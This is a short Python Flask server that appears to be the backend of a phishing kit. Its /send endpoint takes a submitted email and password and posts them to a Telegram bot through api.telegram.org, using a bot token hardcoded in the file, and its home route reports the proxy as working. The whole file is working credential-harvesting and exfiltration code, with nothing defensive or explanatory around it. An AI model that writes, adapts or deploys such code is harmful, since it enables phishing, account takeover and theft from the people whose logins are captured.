from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8568458304:AAG96dlVU9ejU25FodbTtePDTpEZgq-N_6Y"
YOUR_CHAT_ID = "8568458304"

@app.route('/send', methods=['POST'])
def send():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    msg = f"✅ NEW\n📧 {email}\n🔑 {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": YOUR_CHAT_ID, "text": msg})
    return "OK", 200

@app.route('/', methods=['GET'])
def home():
    return "⚔️ PROXY KHDAM ⚔️", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)